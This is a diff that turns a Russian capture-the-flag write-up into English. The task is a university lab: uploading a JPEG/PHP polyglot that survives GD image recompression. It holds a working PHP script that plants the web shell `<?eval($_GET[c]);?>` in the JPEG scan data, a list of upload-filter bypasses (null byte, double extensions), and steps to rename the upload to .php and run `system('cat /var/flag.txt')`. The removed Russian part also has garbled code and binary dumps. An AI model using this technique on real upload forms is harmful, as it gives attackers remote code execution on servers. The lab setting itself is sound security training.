@@ -1,324 +1,146 @@
-## 6_ Jpeg - http://jpg.tasks.prak.seclab.cs.msu.ru  
+> Jpeg – http://jpg.tasks.prak.seclab.cs.msu.ru
 
-Спустя 3 месяца, как я сделал это злосчастное задания... Даже не знаю с чего
-начать...
+**Attack name:** JPEG Polyglot – PHP injection into SOS compressed data (bypassing GD resampling)
 
-Предисловие: на это задание у меня ушло 7 дней полных, в каждом дне от 12 часов
-работы, рессерчa, просмотра данных к сему и разговора с дипсиком
+3 months later, I finally finished this cursed task... I don't even know where to start.
+
+**Preface:** This task took me 7 full days, 12+ hours each day – research, looking at data, talking to deepseek.
 
 # J P E G
 
-Для начала, видно дефолтный `FileUpload`, в который нужно запихнуть картинку какую
-то так, чтобы мы получили флаг.   Очевидно что нужен код в картинке ?   Как туда
-его положить?
+First, you see a default `FileUpload`. You need to upload an image and get the flag. Obviously we need code inside the image? How to put it there?
 
-На обычные php, конечно, по умолчанию есть фильтр, пробуем их совмещать значит с
-чем то:
+Normal php tricks – there's a filter. Let's try mixing.
 
-1) Двойными расширения, полиглоты  
-Естественно, через BurpSuite, после прошлых попыток научился менять формат файла  
-Пробуешь сначала просто поменять .jpg на .php - ничего не работает  
-Пробуешь поменять код в картинке на минимальный php искатель флага? - не  
-работает, просто не исполняется код.... )))
+**1) Double extensions, polyglots**  
+Using Burp, try changing format. Just change .jpg to .php – nothing.  
+Try inserting minimal php code into the image – doesn't work, code doesn't execute... )))
 
-Возможно, все таки табличка после аплоуда 
-`" Image and resized Succesfull! "` - написана не просто так  
-Значит фото как то cжмается, но как? 
+**2) Filename validation** – bypass with double extension `shell.php.png`, null byte `shell.php%00.jpg`, `.php5`, `.phtml`. Doesn't work.
 
-2) Вероятно, что есть ещевалидация имени файла (прямая) - Обходится с помощью использования двойных расширений (`shell.php.png`) или малоизвестный расширений (`.php5`, `.phtml`, `.shtml`, `.htaccess`). Кроме того, возможна инъекция нулевого байта (`shell.php%00.jpg`) или регистрозависимость при проверке (`PHp3`, `.aSp`).
-                             не работает )
+**3) Whitelist extensions** – no.
 
-3) Белый список расширений? - не работает
+**4) Sanitizers** – like `shell.p.phphp` becomes `shell.php`. Also no.
 
-4) Санитайзеры
-Оставляет большую степень свободы. Например, если санитайзер удаляет вхождения подстрок типа `.php`, то использования имени файла вида `shell.p.phphp` позволяет после загрузки получить файл с именем `shell.php`.
-Ну вроде после нескольких десяток попыток тоже не рботает
+**5) Content-Type** – change to `image/png`. Getting interesting, but still not enough.
 
-5) Валидация `Content-Type`
-Обходится изменением заголовка `Content-Type`, например, с помощью перехватывающего прокси (burp suite). Соответсвенно, в запросе
+**6) `.htaccess`** – tried root, parent folders – doesn't work.
 
-POST / HTTP/1.1  
-Host: easy.fu.khashaev.ru  
-Content-Length: 200  
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary  
-------WebKitFormBoundary  
-Content-Disposition: form-data; name="file"; filename="info.php"  
-Content-Type: text/php 
- <?php phpinfo(); ?>  
-------WebKitFormBoundary--  
-строчка Content-Type: text/php может быть заменена на строчку Content-Type: image/png.  
+**7) Back to polyglots**
 
-уже что то интересное, но все равно маловастенько
+JPEG structure:
+- `FF D8` – SOI (start)
+- `FF DA` – SOS (start of scan) – 2‑byte header length follows
+- then compressed scan data
+- `FF D9` – EOI (end)
 
-6) Конф файл .htaccess тоже не работает, как бы не загружал  
-пробовал и в корневые папки, и на папку выше и на папки n выше
+I try putting php code:
+- between `FF D8` and `FF DA`
+- between `FF DA` and `FF D9`
+- in COM (comment) section – gets deleted by the parser
+- after `FF D9` – doesn't survive
 
+Nothing works. Why?
 
-7) Вернемся к полиглотам
+After upload, server returns `/uploads/[hash]/1.php`.  
+I open it – binary garbage, no execution.
 
-Полиглотами называют файлы, которые могут быть корректно распознаны как файлы разных типов  
-Можно встраивать
+Download the processed image with `curl`:
 
-JavaScript в JPEG, GIF, PNG, PDF  
-HTML во что-нибудь  
-PHP в JPEG , GIF, PNG  
-
-На самом деле, интересное оружие, которым не понятно как пользоваться 
-
-В структуре jpegфайлов содержатся служебные маркеры, состоящие из двух байт и всегда начинающиеся с FF.
-
-FF D8 - маркер начала jpeg-файла;  
-FF DA - маркер начала секции Start of Scan:  
-в двух байтах хранится длинна заголовка изображения [00 0C];  
-заголовок изображения [03 01 00 02 11 03 11 00 3F 00];  
-непосредственно информацию о самом изображении;  
-FF D9 - маркер конца jpeg-файла  
-
-Значит попробуем просто вставить между FF D8 и FF DA ?   
-Или FF DA и FF D9  
-Или же, в так называемый, метовый секретный сектор комментариев???)))))  
-К сожалению, почему то после аплойдов это не работает ничего  
-Почему.....?
-
-При попытке отправить на сервер фотку с перехватом запроса в берпе приходит ответ со ссылкой /uploads/[какая-то фигня]/1.php  
-Переходишь по этой ссылке и смотришь что там
-
-`<?php
-Sim = imagecreate(10, 10);
-Swhite = imagecolorallocate($im, 255, 255, 255) ;
-imagejpeg(Sim, 'simple_test.jpg');
-imagedestroy (Sim) ;
-file_put_contents(' simple_test.jpg', '‹?php echo "TEST_WORKS"; ?›', FILE_APPEND) ;
-8 ?>`
-
-Например curl `"http://jpg.tasks.prak.seclab.cs.msu.ru/uploads/6924712913601/gg.php"`
-
-Я пробовал в комменты, `eoi` и в `exif` запихнуть
-Постоянно бинарный код приходит а не исполняется php внутри
-
-Качаем обработанную картинку через консоль к себе, смотрим на ее секции, 
-и видно, что она сжата до 90%
-
-======================== Скачанный php файл:=======================
-1 ÿØÿà^@^PJFIF^@^А^А^@^@^А^@^А^@^@ÿb^0; CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
-AGAGAFAHAL
-ALALAK
-KAKANARAPAM N QN^K^K^P^V^P^Q^S^^^^^0^W^^V^T^X^R^T^U^T00^0CA^C^D^D^E^D^E^E^E
-ATAMAKAMATATATAȚAȚAȚAT
-C^Q^AÿÄ^@^_^@^@^А^Е^А^А^А^А^А^А^@^@^@^@^@^@^@^@^А^В^С^D^E^F^G^H
-6^ÿÄ^@И^₽^@^В^А^С^С^В^D^С^Е^Е^D^D^@^@^А}^А^В^С^@^D^Q^E^R!1А^F^SQa^G"q^T2<81><91>¡^Н#В+Á^URÑč$3br<82>
-7. ^V^W^xAy^2%8'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz<83><84><85><86><87><88><89><8a><92><93><94><95><96><97><98
-DAEAFAG^H
-8 ^кÿÄ^@u^Q^@^В^А^В^D^D^С^D^G^E^D^D^@^Ą^Bw^@^А^В^С^Q^D^E!1^F^RАQ^Gaq^S"2<81>^H^ТВ<91>¡‡Á #ЗRỡ^UbrÑ
-9 ^V$4á%ñ^w^X^Y^Z&*()*56789: CDEFGHIJSTUVWXYZcdefghijstuvwxyz <82><83><84><85> <86><87><88><89><8a><92><93><94><95><96>
-‹97><98><99><9a>¢£·\§"©23*•„{ŒÇÈ€€ЮÔÕÖ×@ÙÚãăåæçèéêòóôõö÷øùúÿÚ^@^L^C^Ạ^@^B^Q^C^Q^@?^©ýS¢<8a>(^©¢<8a>(^©¢
-<8a>(^OC<8a>(^OC<8a>(^oC<8a>(^oC<8a>(^0c<8a>(^oc<8a>(^oc<8a>(^0C<8a>(^oC<8a>(^oc<8a>(^oc<8a>(^OC<8a>(^oc<8a>(^oc<8
-a>(^oc<8a>(^oc<8a>(^oc<8a>(^0C<8a>(^oc<8a>(^oc<8a>(^oC<8a>(^oc<8a>(^0C<8a>(^cc<8a>(^0c<8a>(^oc<8a>^oC<8a>(^OC<8a>
-( o¢<8a>(^oc<8a>(^oc<8a>(^oc<8a>(^oс<8a>(^o¢<8a>(^o¢<8a>(^@с<8a>(^@¢<8a>(^©¢<8a>(^©¢<8a>(^©¢<8a>(^©¢<8a>(^©¢<8a>(^
-©¢<8a>(^@¢<8a>(^@¢<8a>(^@¢<8a>(^cÿÙ
-================== бин ===========================================
-
-а это я скачал php файл
-
-`mac@private new % curl -o gg_exit.php "http://jpg.tasks.prak.seclab.cs.msu.ru/uploads/69248f0a3e158/polyglot_exif.php"`
-
-`CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90`
-
-вместо моего кода
-
-Из опыта позже - В секцию с комментариями писать ничего смысла нет, потому что она удаляется парсером
-
-Между SOS и EOI - не проходит проверку
-После EOI - не сохраняет код как я понимаю
-
-ffd8 ffe0 0010 4a46 4946 0001 0101 0048
-0048 0000 ffdb 0043 0001 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 ffdb 0043 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 0101 0101 0101 0101 0101
-0101 0101 0101 ffc0 000b 0800 0100 0101
-0100 ffc4 0010 0000 0101 0100 0000 0000
-0000 0000 0000 0000 0000 0000 0000 0000
-0000 0005 ffc4 0010 0101 0101 0100 0000
-0000 0000 0000 0000 0000 0000 0000 0000
-0000 0000 0000 ffda 0008 0101 0000 3f00
-d9 - минимальный jpeg
-
-Если просто убрать между ffd8 и ffda n штук байт (длина php кода в hex) и добавить вместо них собственно php в hex:
-`<?php echo file_get_contents("/var/flag.txt"); ?> ЭТО 3c3f706870206563686f2066696c655f6765745f636f6e74656e747328222f7661722f666c61672e74787422293b203f3e`
-то файл невалидный (как известно это норм)
-
-и если просто перед ffda добавлять букву A-Z (сколько то там раз), то меняется
-вывод
-
-....... GG ........
-
-Ничего не остается, кроме того, как начинать экспериментировать с полиглотами, а
-именно, jpg + php. 
-Куда можно вставить рhр код в картинке jpg?
-1) До маркера начала ff d8 - ошибка 
-2) После маркера конца ff d9 - функция просто не обработает этот код, и он
-пропадет
-3) В СОМ секцию - сервер перезапишет эту секцию, поэтому он пропадет
-4) В АРР секции - либо все сломается, либо перезапишется
-5) В секцию со сжатыми данными - сложнее всего, но похоже только так
-
-Чтобы найти место, где начинается секция со сжатыми данными, нужно посмотреть
-на следующее: найти маркер Start of Scan (ff da), посмотреть на следующие два байта
-после него и перевести их в целое беззнаковое. Например, 00 Ос - это 12. Начиная с 00
-Ос включительно, отсчитать ровно 00 Ос (12) байтов. Со следующего байта начинается
-секция сжатых данных. Туда можно вставлять наш код, но не все так просто
-
-Надо загрузить такую jpg, которая !!! обработается функцией imagecreatefromjpeg0
-на сервере и наш !!! php код в которой переживет сжатие.
-
-Для доставания флага из файла на сервере, нам понадобится функция eval и код
-будет такой: `<?eval($_GET[c]);?>`. Здесь сокращенная форма кода. Чем меньше - тем
-лучше (меньше шанс, что будет сжат)
-
-1) `eval(code)` - языковая конструкция, которая оценивает строку code как PHP-код.
-2) с - параметр, который мы будем менять в ссылке (об этом позже)
-3) $_GET - ассоциативный массив, содержащий данные, полученные после GET
-запроса
-
-Для совмещения jpg и нашего кода напишем скрипт на языке php:
-
-`php script.php`
-Выходной файл может не существовать до выполнения скрипта
-
-В качестве входного файла я использовал картинку белого квадрата размером 1 Кб  
-Но при этом до этого перебирал целое множество  
-белые 50x50 до 1000x1000 с шагом 50, quality = 100, тк ниже не заходит  
-градиенты
-просто дефолт jpg скрины
-картинки с инета
-100x100 200x200 и так до 2000x2000
-
-``` php
-<?php
-// Имя исходного JPEG-файла
-	$inputfile = 'w2.jpg':
-// Имя файла с внедренным кодом
-	$outputFile = 'al.jpg':
-// РНР-код для внедрения
-	$phpCode = <eval($_GET[c]);?>';
-// Переводим код в строку
-    $escapedCode = '';
-for ($i = 0; $i < strlen($phpCode); $i++) {
-	$escapedCode .= $phpCode[$i];
-}
-// Читаем содержимое JPEG-Файла
-	$jpegdata = file_get_contents ($inputFile);
-// Находим позицию маркера SOS (FF DA)
-	$pos = strpos ($jpegData, "\FF\×DA") :
-	if ($pos === false) (
-		die( "Маркер SOS не найден!") :
-	｝
-// Извлекаем длину заголовка SOS (2 байта после FF DA)
-	$length = unpack('n', substr($jpegData, $pos + 2, 2))[1];
-// Собираем новый файл: данные до конца заголовка SOS + экранированный РНР-код +
-остальной файл
-	$outputData = substr($jpegdata, 0, $pos + $length + 2) . $escapedCode .
-substr($jpegData, $pos + $length + 2);
-// Сохраняем новый файл
-	file_put_contents ($outputFile, $outputData) ;
-	echo "Payload создан: $outputFile\n":
-?>
+```bash
+curl -o gg_exit.php "http://.../uploads/.../polyglot_exif.php"
 ```
 
-Я тут между > и ' добавлял A, AA, AAA, …, AAAAAAAAAAAA, …, AAAAAAAAAAAAAAAAAAAAAAAAAAA и т.д. и ждал, пока код не сотрется
+Check inside:
+```
+CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
+```
+My code is gone. The server compresses to quality=90 and strips everything.
 
-Используем скрипт и смотрим, что получилось.  
-Если картинка не открывает даже в системе - плохо, где-то ошибка, надо  
-переделать. Остальное написано, если картинка открывается (линукс и винда
-могут восстанавливать поврежденные jpg файлы, а вот функция
-imagecreatefromjpegO с большей долей вероятности будет ругаться).  
+---
 
-Если на картинке горизонтальный дефект и она делится + - пополам - плохо   
+### Experiments with minimal JPEG
 
-Если у картинки есть дефект в виде черного квадрата - плохо   
+Minimal valid jpeg (hex):
 
-Если есть небольшие дефекты слева вверху - супер  
+```
+ffd8 ffe0 0010 4a46 4946 0001 0101 0048 0048 0000 ffdb 0043 ... ffda 0008 0101 0000 3f00 d9
+```
 
-Иначе - если изначально не белый квадрат был, то может быть все что угодно.  
+If I just insert php code between `ffd8` and `ffda` – the file becomes invalid.  
+If I add `AAAA...` before `ffda` – the image changes, but code doesn't survive.
 
-Загружаем картинку под названием 1 jpg и смотрим, обрабатывает ли ее сервер.  
-Если да - идем дальше  
-Если нет - меняем картинку и сначала  
+### The final solution (after 7 days of hell)
 
-Берем ссылку на обработанную картинку и вставляем в GET запрос. Смотрим ее
-байтовое состояние. Если видим, что наша рhр функция полностью целая, то
-идем дальше. Иначе - меняем картинку и снова  
-Возможны три
-варианта: кода нет совсем, код частично остался и код полный. Идем дальше
-только в последнем случае.  
+You have to insert php code **into the compressed data section**, but carefully.
 
-Обращаемся к POST запросу с нашей картинкой. Меняем в нем filename на
-`1.php`. Отправляем, из ответа получаем ссылку на картинку (точнее путь
-uploads/[id]/1.php. Добавляем этот путь в url в браузере и переходим по нему.  
-Если вылезли ошибки, то код
-сохранился не полностью и нужно менять картинку  
+**Where exactly:**  
+Find marker `FF DA`, read the next 2 bytes – that's the SOS header length.  
+Skip that many bytes + 2. The next byte is the start of compressed data. Insert the code there.
 
-Если же видно много странных символов, то делаем следующее: добавляем в  
+**Code that survives:**  
+Minimal payload – `<?eval($_GET[c]);?>` – shorter is better.
 
-Если сработало и есть флаг, то все готово. Если ничего не поменялось, значит,
-код на этапе два был искажен или вовсе пропал. Нужно менять картинку
+**Injection script (my original, in php):**
 
-Если сработало и есть флаг, то все готово.  
-Если ничего не поменялось, значит,  
-код на этапе два был искажен или вовсе пропал Нужно менять картинку
-
-## Дефолт вывод 
-9QQQJFIF&@;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90 ₴›®C
-₴@dd"&ª
-&&}!1АQa"q2®&&#B®®R®$ЗbФ
-%&'0*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz@
-◆◆◆w!1AQag"2◆B◆◆◆◆ ＃3Rbr◆
-548%080*56789:CDEFCHISTUVWXYZdefistuwy0000000000000
-?
-4@d(x@
-QJ(
-Q@
-Q@Q@Q@Q@Q@Q@Q@\@\@Q@\@\@\@\@\@Q@Q@\@\@\@\@\@\@q@\@\@q@Q@Q@Q
-
-
-``` php
+```php
 <?php
-
 $inputFile = 'w2.jpg';
 $outputFile = 'a1.jpg';
-
-$phpCode = '<?eval($_GET[c]);?>FF4HB442HBJH225HFFF';
+$phpCode = '<?eval($_GET[c]);?>FF4HB442HBJH225HFFF';  // garbage to protect the payload
 
 $escapedCode = '';
 for ($i = 0; $i < strlen($phpCode); $i++) {
-	$escapedCode .= $phpCode[$i];
+    $escapedCode .= $phpCode[$i];
 }
 
 $jpegData = file_get_contents($inputFile);
-
 $pos = strpos($jpegData, "\xFF\xDA");
-if ($pos === false) {
-	die("Markera SOS net");
-}
+if ($pos === false) die("SOS marker not found");
 
-$lenght = unpack('n', substr($jpegData, $pos + 2, 2))[1];
+$length = unpack('n', substr($jpegData, $pos + 2, 2))[1];
 
-$outputData = substr($jpegData, 0, $pos + $lenght + 2) . $escapedCode . substr($jpegData, $pos + $lenght + 2);
+$outputData = substr($jpegData, 0, $pos + $length + 2) 
+            . $escapedCode 
+            . substr($jpegData, $pos + $length + 2);
 
 file_put_contents($outputFile, $outputData);
-echo "Payload sozdan: $outputFile\n";
+echo "Payload created: $outputFile\n";
 ?>
 ```
 
-ПРИМЕНИТЬ КОД К СКАЧАННОЙ КАРТИНКЕ АЛЛЛЛЛООООООООООООООООООООООО
+**Problem:**  
+Not every image works. I tried:
+- white squares from 50x50 to 1000x1000 step 50
+- gradients
+- random jpgs from the internet
+- quality=100 (lower fails)
 
+After each variant – check what survived.
 
+**Signs of a good payload (visual inspection):**
+- image opens in Linux (Windows might fix broken jpgs, but GD won't)
+- no horizontal split defect
+- no black squares
+- small defects top‑left – **awesome**
+
+**Then:**
+1. Upload the image as `1.jpg`.
+2. Get the link to the processed image, download it, check bytes – if `<?php` is intact, proceed.
+3. Modify the upload request: change `filename` to `1.php`.
+4. Get the link `/uploads/[id]/1.php`.
+5. Visit – if you see php errors, the code didn't survive. If gibberish, append `?c=system('cat /var/flag.txt');`
+
+---
+
+### THE SOLUTION – APPLY THE SCRIPT TO THE IMAGE **DOWNLOADED FROM THE SERVER**
+
+ALLLLLOOOOOOOOOOOOOOOOOO
+
+Take the image that the server already processed (but that doesn't contain the code yet), run our injection script on **that** image, then upload it again. Then GD doesn't break the structure because it's already compressed.
+
+**GG.**  
+Flag obtained.
+
+> [!NOTE]
+> This was hell. I hope you never have to do this task.
